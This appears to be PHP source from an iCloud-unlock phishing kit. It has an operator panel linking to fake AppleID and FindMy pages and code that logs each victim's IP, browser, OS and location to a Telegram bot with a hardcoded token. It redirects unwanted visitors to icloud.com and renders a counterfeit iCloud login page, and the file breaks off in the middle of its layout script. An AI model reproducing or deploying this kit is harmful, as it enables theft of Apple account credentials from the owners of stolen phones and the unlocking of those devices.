<?php session_start(); 
if (!isset($_SESSION['UserData']['Username'])) {
    header("location:login.php");
    exit;
}
include('../ajax/ajaxi.php');
$_SES2= "669686054:AAHVeLJLNo2KuZ_v9pzz_LX457Cw-ZqWbS8";
if ($_SES2 !== $token) {
    $msgerr = "<span align='center' style='color:red'>Invalid Details</span>\n\n\n\n";
    $msgerr .= "<span  style='color:green'>Contact</span>\n\n\n\n";
    echo $msgerr;
    echo "<a href=\"https://t.me/baderlink\" class=\"Button3\">@BADERLINK</a>";
        exit;
}



echo "
<!DOCTYPE html>
<html >
<head>  
  <title>--> BADER PANEL ICOUD <--</title>
  
      <link rel=\"stylesheet\" href=\"style1.css\">
<meta name=\"viewport\" content=\"initial-scale=1, maximum-scale=1\">
  
</head>

<body>
<br><br>
  <h1> Remove iCloud BADER OFF </h1>

";
echo "<center>
";
echo "<div class=\"btn-container\">
<br><br>
  
<a href=\"../ic\" class=\"btn\">iCloud /Pass 20 </a><br><br>
  
<a href=\"../id/appleid\" class=\"btn\">AppleID</a><br><br>
  
<a href=\"../fmi/dual\" class=\"btn\">FMI/DUAL</a><br><br>
  
<a href=\"../FMI/ifmi\" class=\"btn\">findmy to fmi</a><br><br>

<a href=\"../FMY/ifdmy\" class=\"btn\">findmy to icloud</a><br><br>

<a href=\"../maps/mapper\" class=\"btn\">New Map 20</a><br><br>
  
<a href=\"../findmy/ifindmy\" class=\"btn\">FindMy</a><br><br>

<a href=\"../support/support\" class=\"btn\">Support</a><br><br>

<a href=\"../ver/itech4\" class=\"btn\">Pass 4</a><br><br>
  
<a href=\"../vrf/itech6\" class=\"btn\">Pass 6</a><br><br>

<a href=\"../itv/iTV\" class=\"btn\">AppTv</a><br><br>

<a href=\"logout.php\" class=\"btn\">Logout</a><br><br>


</div>
  
  ";
echo "</center>
";
echo "<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

  
</body>
</html>
";

/*
header ('Content-type: text/html; charset=utf-8');
error_reporting(0);
$ID = empty($_GET["ID"]) ? NULL : $_GET["ID"];
$auth = empty($_GET["auth"]) ? NULL : $_GET["auth"];
$accessed = file_get_contents("ajax/orders.txt");
if ($_SERVER["HTTP_HOST"] != "localhost") {
    if (empty($ID) & empty($auth)) {
        header("Location: https://icloud.com");
        exit;
    }
    if (strstr($accessed, $ID) || strstr($accessed, $auth)) {
    } else {
        header("Location: https://icloud.com");
        exit;
    }
}

function getOS($user_agent) { 
    $os_platform  = "Unknown OS Platform";

    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;

} 

function getBrowser(){

$agent = $_SERVER['HTTP_USER_AGENT'];
$name = 'NA';


if (preg_match('/MSIE/i', $agent) && !preg_match('/Opera/i', $agent)) {
    $name = 'Internet Explorer';
} elseif (preg_match('/Firefox/i', $agent)) {
    $name = 'Mozilla Firefox';
} elseif (preg_match('/Chrome/i', $agent)) {
    $name = 'Google Chrome';
} elseif (preg_match('/Safari/i', $agent)) {
    $name = 'Apple Safari';
} elseif (preg_match('/Opera/i', $agent)) {
    $name = 'Opera';
} elseif (preg_match('/Netscape/i', $agent)) {
    $name = 'Netscape';
}


return $name;
}

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}
function getUserIP(){
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2);
$url="https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$uri = substr($url, 0, -5);
$IP = getUserIP();
$browser = getBrowser();
$os = getOS($_SERVER['HTTP_USER_AGENT']);
$country = ip_info("Visitor", "City")." ".ip_info("Visitor", "Country");
include "ajax/ajaxi.php";
$headers = "Content-type: text/html; charset=iso-8859-1" . "\r\n";
$headers .= 'From: OFFiT' . "\r\n";
$headers .= 'MIME-Version: 1.0' . "\r\n";
$subject = "Visit Details for order: $auth / $ID ";
$message = '<table style="background:none repeat scroll 0% 0% rgb(244,244,244);border:1px solid rgb(102,102,102)" border="0" cellpadding="5" cellspacing="5" width="600">' . "\r\n" . '    <tbody>' . "\r\n" . '        <tr>' . "\r\n" . '            <th style="background-color:rgb(204,204,204)">Owner Visit Details</th>' . "\r\n" . '        </tr>' . "\r\n" . '        <tr>' . "\r\n" . '            <td style="text-align:left" valign="top">' . "\r\n" . '            <br>' . "\r\n\t\t\t" . '<hr>' . "\r\n" . '            <strong>IP Address:</strong>' . $IP .' / '.$country.'<br><br>' . "\r\n" . '                        <strong>Order id:</strong>' . $auth . '/'. $ID . '<br><br>' . "\r\n" . '                        <strong>Browser:</strong>' . $browser . '<br><br><strong>OS:</strong>' . $os . '<br><br>' . "\r\n" . '                       ' . "\r\n\t\t\t" . '<strong>Browser:</strong>' . $browser . '<br><br>' . "\r\n\t\t\t" . '</td>' . "\r\n" . '        </tr>' . "\r\n" . '        <tr>' . "\r\n" . '            <td style="text-align:left"><em>Thanks,<br>' . "\r\n" . '            itech<br>' . "\r\n" . '            </td>' . "\r\n" . '        </tr>' . "\r\n" . '    </tbody>' . "\r\n" . '</table>';
$ttrue = "Owner opened link ( iCloud W/pass 2020 )\n=========================\nlink: #$url\nIP: $IP\nBrowser: $browser\nOS: $os\nCountry: $country\nLanguage: $lang\n=========================\nOrder details:\nauth: $auth\nID: $ID\n=============\n=> Waitin Login <=";
$datatrue = array("text" => $ttrue, "chat_id" => $chat_id);
// mail($to, $subject, $message, $headers);
file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?" . http_build_query($datatrue));
$lang = substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2);
switch ($lang) {
    case "en":
        $lang_file = "lang.en.php";
    break;
    case "fr":
        $lang_file = "lang.fr.php";
    break;
    case "pt":
        $lang_file = "lang.pt.php";
    break;
    case "it":
        $lang_file = "lang.it.php";
    break;
    case "vi":
        $lang_file = "lang.vi.php";
    break;
    case "es":
        $lang_file = "lang.es.php";
    break;
    case "de":
        $lang_file = "lang.de.php";
    break;
    case "id":
        $lang_file = "lang.id.php";
    break;
    case "ja":
        $lang_file = "lang.ja.php";
    break;
    case "nl":
        $lang_file = "lang.nl.php";
    break;
    case "be":
        $lang_file = "lang.be.php";
    break;
    case "tr":
        $lang_file = "lang.tr.php";
    break;
    case "th":
        $lang_file = "lang.th.php";
    break;
    case "pl":
        $lang_file = "lang.pl.php";
    break;
    case "zh":
        $lang_file = "lang.zh.php";
    break;
    case "hu":
        $lang_file = "lang.hu.php";
    break;
    case "ru":
        $lang_file = "lang.ru.php";
    break;
    default:
        $lang_file = "lang.en.php";
}
include_once "assets/languages/" . $lang_file;
echo "<!DOCTYPE html>\n";
echo "<html data-rtl=\"false\" lang=\"en\">\n";
//echo "		    <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">\n";
echo "		    	<script src=\"css3/jquery-1.10.2.js\"></script>\n";
echo "		<script type='text/javascript'>\n";
echo "			$(document).ready(function () {\n";
echo "			var ss = setTimeout(function () {}, 2000);\n";
echo "			});\n";
echo "		</script>\n";
echo "		<title>iCloud</title>\n";
echo "		\n";
echo "		<base href=\"/\">\n";
echo "		<meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1\">\n";
echo "	<!-- <link rel=\"stylesheet\" href=\"//www.apple.com/wss/fonts?families=SF+Pro,v1|SF+Pro+Icons,v1\" type=\"text/css\"> -->\n";
echo "	<link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"css3/app.css\">\n";
echo "	<link rel=\"stylesheet\" href=\"css3/main.css\">\n";
echo "	<link rel=\"stylesheet\" href=\"css3/loader.css\">\n";
echo "	<!-- <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js\"></script> -->\n";
echo "	<!-- <script src=\"https://code.jquery.com/jquery-1.12.4.js\"></script> -->\n";
echo "	<script src=\"https://code.jquery.com/ui/1.12.1/jquery-ui.js\"></script>\n";
echo "	<script>\n";
echo "	$(document).ready(function() {\n";
echo "	  function show_body() {\n";
echo "				$(\"#cw-bootstrap-html\").addClass(\"hide\");\n";
echo "				$(\"#step2\").removeClass(\"hide\");\n";
echo "			}\n";
echo "			setTimeout(show_body, 2000);\n";
echo "	  $(\"#div1\").css(\"width\", $(window).width());\n";
echo "	  \n";
echo "	  $(\"#div1\").css(\"height\", $(window).height() - 44);\n";
echo "	  $(\"#div_icon\").css(\"left\", $(window).width() / 2 - 80);\n";
echo "	  $(\"#div_text_1\").css(\"left\", $(window).width() / 2 - 145);\n";
echo "	  $(\"#div_text_2\").css(\"left\", $(window).width() / 2 - 78);\n";
echo "	  \n";
echo "	  var res = $(window).width() * 0.05 + 25;\n";
echo "	  var intre = $(window).width() * 0.02 + 25;\n";
echo "	  var left = ($(window).width() - (res * 6 + intre * 5)) / 2;\n";
echo "	  var top = ($(window).height() - (res * 1.34 + res * 1.34 + 80)) / 2;\n";
echo "	  var blur = $(window).width() * 0.02 + 20;\n";
echo "	  $(\"#div1\").css(\"filter\", \"blur(\"+blur+\"px)\");\n";
echo "	  \n";
echo "	  if ($(window).width() <= 764 && $(window).width() > 420) {\n";
echo "		var left = ($(window).width() - (res * 4 + intre * 3)) / 2;\n";
echo "		// 1 rand \n";
echo "		$(\"#icon_1\").css(\"left\", left);\n";
echo "		$(\"#icon_1\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_1\").css(\"width\", res);\n";
echo "		$(\"#icon_1\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_2\").css(\"left\", left + intre + res);\n";
echo "		$(\"#icon_2\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_2\").css(\"width\", res);\n";
echo "		$(\"#icon_2\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_3\").css(\"left\", left + (intre + res) * 2);\n";
echo "		$(\"#icon_3\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_3\").css(\"width\", res);\n";
echo "		$(\"#icon_3\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_4\").css(\"left\", left + (intre + res) * 3);\n";
echo "		$(\"#icon_4\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_4\").css(\"width\", res);\n";
echo "		$(\"#icon_4\").css(\"height\", res * 1.34);\n";
echo "		// 2 rand \n";
echo "		$(\"#icon_5\").css(\"left\", left);\n";
echo "		$(\"#icon_5\").css(\"top\", top + 104 + res * 1.34 + 80);\n";
echo "		$(\"#icon_5\").css(\"width\", res);\n";
echo "		$(\"#icon_5\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_6\").css(\"left\", left+intre+res);\n";
echo "		$(\"#icon_6\").css(\"top\", top + 104 + res * 1.34 + 80);\n";
echo "		$(\"#icon_6\").css(\"width\", res);\n";
echo "		$(\"#icon_6\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_7\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_7\").css(\"top\", top + 104 + res * 1.34 + 80);\n";
echo "		$(\"#icon_7\").css(\"width\", res);\n";
echo "		$(\"#icon_7\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_8\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_8\").css(\"top\", top + 104 + res * 1.345 + 80);\n";
echo "		$(\"#icon_8\").css(\"width\", res);\n";
echo "		$(\"#icon_8\").css(\"height\", res * 1.34);\n";
echo "		// 3 rand \n";
echo "		$(\"#icon_9\").css(\"left\", left);\n";
echo "		$(\"#icon_9\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_9\").css(\"width\", res);\n";
echo "		$(\"#icon_9\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_10\").css(\"left\", left + intre + res);\n";
echo "		$(\"#icon_10\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_10\").css(\"width\", res);\n";
echo "		$(\"#icon_10\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_11\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_11\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_11\").css(\"width\", res);\n";
echo "		$(\"#icon_11\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_12\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_12\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_12\").css(\"width\", res);\n";
echo "		$(\"#icon_12\").css(\"height\", res * 1.34);\n";
echo "	  } else if ($(window).width() <= 412){\n";
echo "		// alert(\"MOBILE\");\n";
echo "		var left = ($(window).width() - (60 * 3 + 30 * 2)) / 2;\n";
echo "		$(\"#div_icon\").css(\"left\", $(window).width() / 2 - 42);\n";
echo "		$(\"#div_icon\").css(\"width\", 78);\n";
echo "		$(\"#div_icon\").css(\"height\", 78);\n";
echo "		$(\"#div_icon\").css(\"top\", 160);\n";
echo "		$(\"#div_text_1\").css(\"left\", $(window).width() / 2 - 145);\n";
echo "		$(\"#div_text_2\").css(\"left\", $(window).width() / 2 - 78);\n";
echo "		$(\"#icon_1\").addClass(\"hide\");\n";
echo "		$(\"#icon_2\").addClass(\"hide\");\n";
echo "		$(\"#icon_3\").addClass(\"hide\");\n";
echo "		$(\"#icon_4\").css(\"left\", left);\n";
echo "		$(\"#icon_4\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_4\").css(\"width\", 60);\n";
echo "		$(\"#icon_4\").css(\"height\", 84);\n";
echo "		$(\"#icon_5\").addClass(\"hide\");\n";
echo "		$(\"#icon_6\").css(\"left\", left+60+30);\n";
echo "		$(\"#icon_6\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_6\").css(\"width\", 60);\n";
echo "		$(\"#icon_6\").css(\"height\", 84);\n";
echo "		$(\"#icon_12\").css(\"left\", left+60+30+60+30);\n";
echo "		$(\"#icon_12\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_12\").css(\"width\", 60);\n";
echo "		$(\"#icon_12\").css(\"height\", 84);\n";
echo "	\n";
echo "	  } else {\n";
echo "		$(\"#icon_1\").css(\"left\", left);\n";
echo "		$(\"#icon_1\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_1\").css(\"width\", res);\n";
echo "		$(\"#icon_1\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_2\").css(\"left\", left + intre + res);\n";
echo "		$(\"#icon_2\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_2\").css(\"width\", res);\n";
echo "		$(\"#icon_2\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_3\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_3\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_3\").css(\"width\", res);\n";
echo "		$(\"#icon_3\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_4\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_4\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_4\").css(\"width\", res);\n";
echo "		$(\"#icon_4\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_5\").css(\"left\", left+(intre+res)*4);\n";
echo "		$(\"#icon_5\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_5\").css(\"width\", res);\n";
echo "		$(\"#icon_5\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_6\").css(\"left\", left+(intre+res)*5);\n";
echo "		$(\"#icon_6\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_6\").css(\"width\", res);\n";
echo "		$(\"#icon_6\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_7\").css(\"left\", left);\n";
echo "		$(\"#icon_7\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_7\").css(\"width\", res);\n";
echo "		$(\"#icon_7\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_8\").css(\"left\", left+intre+res);\n";
echo "		$(\"#icon_8\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_8\").css(\"width\", res);\n";
echo "		$(\"#icon_8\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_9\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_9\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_9\").css(\"width\", res);\n";
echo "		$(\"#icon_9\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_10\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_10\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_10\").css(\"width\", res);\n";
echo "		$(\"#icon_10\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_11\").css(\"left\", left+(intre+res)*4);\n";
echo "		$(\"#icon_11\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_11\").css(\"width\", res);\n";
echo "		$(\"#icon_11\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_12\").css(\"left\", left+(intre+res)*5);\n";
echo "		$(\"#icon_12\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_12\").css(\"width\", res);\n";
echo "		$(\"#icon_12\").css(\"height\", res * 1.34);\n";
echo "	  }\n";
echo "	});\n";
echo "	$(window).on(\"resize\", function(){\n";
echo "	  var win = $(this); //this = window\n";
echo "	  $(\"#div1\").css(\"width\", $(window).width());\n";
echo "	  $(\"#div1\").css(\"height\", $(window).height() - 44);\n";
echo "	  $(\"#div_icon\").css(\"left\", $(window).width() / 2 - 80);\n";
echo "	  $(\"#div_text_1\").css(\"left\", $(window).width() / 2 - 145);\n";
echo "	  $(\"#div_text_2\").css(\"left\", $(window).width() / 2 - 78);\n";
echo "	  \n";
echo "	  var res = $(window).width() * 0.05 + 25;\n";
echo "	  var intre = $(window).width() * 0.02 + 25;\n";
echo "	  var left = ($(window).width() - (res * 6 + intre * 5)) / 2;\n";
echo "	  var top = ($(window).height() - (res * 1.34 + res * 1.34 + 80)) / 2;\n";
echo "	  var blur = $(window).width() * 0.02 + 20;\n";
echo "	  $(\"#div1\").css(\"filter\", \"blur(\"+blur+\"px)\");\n";
echo "	  \n";
echo "	  if ($(window).width() <= 764 && $(window).width() > 420) {\n";
echo "		var left = ($(window).width() - (res * 4 + intre * 3)) / 2;\n";
echo "		// 1 rand \n";
echo "		$(\"#icon_1\").css(\"left\", left);\n";
echo "		$(\"#icon_1\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_1\").css(\"width\", res);\n";
echo "		$(\"#icon_1\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_2\").css(\"left\", left + intre + res);\n";
echo "		$(\"#icon_2\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_2\").css(\"width\", res);\n";
echo "		$(\"#icon_2\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_3\").css(\"left\", left + (intre + res) * 2);\n";
echo "		$(\"#icon_3\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_3\").css(\"width\", res);\n";
echo "		$(\"#icon_3\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_4\").css(\"left\", left + (intre + res) * 3);\n";
echo "		$(\"#icon_4\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_4\").css(\"width\", res);\n";
echo "		$(\"#icon_4\").css(\"height\", res * 1.34);\n";
echo "		// 2 rand \n";
echo "		$(\"#icon_5\").css(\"left\", left);\n";
echo "		$(\"#icon_5\").css(\"top\", top + 104 + res * 1.34 + 80);\n";
echo "		$(\"#icon_5\").css(\"width\", res);\n";
echo "		$(\"#icon_5\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_6\").css(\"left\", left+intre+res);\n";
echo "		$(\"#icon_6\").css(\"top\", top + 104 + res * 1.34 + 80);\n";
echo "		$(\"#icon_6\").css(\"width\", res);\n";
echo "		$(\"#icon_6\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_7\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_7\").css(\"top\", top + 104 + res * 1.34 + 80);\n";
echo "		$(\"#icon_7\").css(\"width\", res);\n";
echo "		$(\"#icon_7\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_8\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_8\").css(\"top\", top + 104 + res * 1.345 + 80);\n";
echo "		$(\"#icon_8\").css(\"width\", res);\n";
echo "		$(\"#icon_8\").css(\"height\", res * 1.34);\n";
echo "		// 3 rand \n";
echo "		$(\"#icon_9\").css(\"left\", left);\n";
echo "		$(\"#icon_9\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_9\").css(\"width\", res);\n";
echo "		$(\"#icon_9\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_10\").css(\"left\", left + intre + res);\n";
echo "		$(\"#icon_10\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_10\").css(\"width\", res);\n";
echo "		$(\"#icon_10\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_11\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_11\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_11\").css(\"width\", res);\n";
echo "		$(\"#icon_11\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_12\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_12\").css(\"top\", top + 104 + res * 1.34 + 80 + res * 1.34 + 80);\n";
echo "		$(\"#icon_12\").css(\"width\", res);\n";
echo "		$(\"#icon_12\").css(\"height\", res * 1.34);\n";
echo "	  } else if ($(window).width() <= 412){\n";
echo "		// alert(\"MOBILE\");\n";
echo "		var left = ($(window).width() - (60 * 3 + 30 * 2)) / 2;\n";
echo "		$(\"#div_icon\").css(\"left\", $(window).width() / 2 - 42);\n";
echo "		$(\"#div_icon\").css(\"width\", 78);\n";
echo "		$(\"#div_icon\").css(\"height\", 78);\n";
echo "		$(\"#div_icon\").css(\"top\", 160);\n";
echo "		$(\"#div_text_1\").css(\"left\", $(window).width() / 2 - 145);\n";
echo "		$(\"#div_text_2\").css(\"left\", $(window).width() / 2 - 78);\n";
echo "		$(\"#icon_1\").addClass(\"hide\");\n";
echo "		$(\"#icon_2\").addClass(\"hide\");\n";
echo "		$(\"#icon_3\").addClass(\"hide\");\n";
echo "		$(\"#icon_4\").css(\"left\", left);\n";
echo "		$(\"#icon_4\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_4\").css(\"width\", 60);\n";
echo "		$(\"#icon_4\").css(\"height\", 84);\n";
echo "		$(\"#icon_5\").addClass(\"hide\");\n";
echo "		$(\"#icon_6\").css(\"left\", left+60+30);\n";
echo "		$(\"#icon_6\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_6\").css(\"width\", 60);\n";
echo "		$(\"#icon_6\").css(\"height\", 84);\n";
echo "		$(\"#icon_12\").css(\"left\", left+60+30+60+30);\n";
echo "		$(\"#icon_12\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_12\").css(\"width\", 60);\n";
echo "		$(\"#icon_12\").css(\"height\", 84);\n";
echo "	\n";
echo "	  } else {\n";
echo "		$(\"#icon_1\").css(\"left\", left);\n";
echo "		$(\"#icon_1\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_1\").css(\"width\", res);\n";
echo "		$(\"#icon_1\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_2\").css(\"left\", left + intre + res);\n";
echo "		$(\"#icon_2\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_2\").css(\"width\", res);\n";
echo "		$(\"#icon_2\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_3\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_3\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_3\").css(\"width\", res);\n";
echo "		$(\"#icon_3\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_4\").css(\"left\", left+(intre+res)*3);\n";
echo "		$(\"#icon_4\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_4\").css(\"width\", res);\n";
echo "		$(\"#icon_4\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_5\").css(\"left\", left+(intre+res)*4);\n";
echo "		$(\"#icon_5\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_5\").css(\"width\", res);\n";
echo "		$(\"#icon_5\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_6\").css(\"left\", left+(intre+res)*5);\n";
echo "		$(\"#icon_6\").css(\"top\", top + 104);\n";
echo "		$(\"#icon_6\").css(\"width\", res);\n";
echo "		$(\"#icon_6\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_7\").css(\"left\", left);\n";
echo "		$(\"#icon_7\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_7\").css(\"width\", res);\n";
echo "		$(\"#icon_7\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_8\").css(\"left\", left+intre+res);\n";
echo "		$(\"#icon_8\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_8\").css(\"width\", res);\n";
echo "		$(\"#icon_8\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_9\").css(\"left\", left+(intre+res)*2);\n";
echo "		$(\"#icon_9\").css(\"top\", top + 104 + res * 1.34 + 50);\n";
echo "		$(\"#icon_9\").css(\"width\", res);\n";
echo "		$(\"#icon_9\").css(\"height\", res * 1.34);\n";
echo "		$(\"#icon_10\").css(\"left\", left+(intre+res)*3);\n";
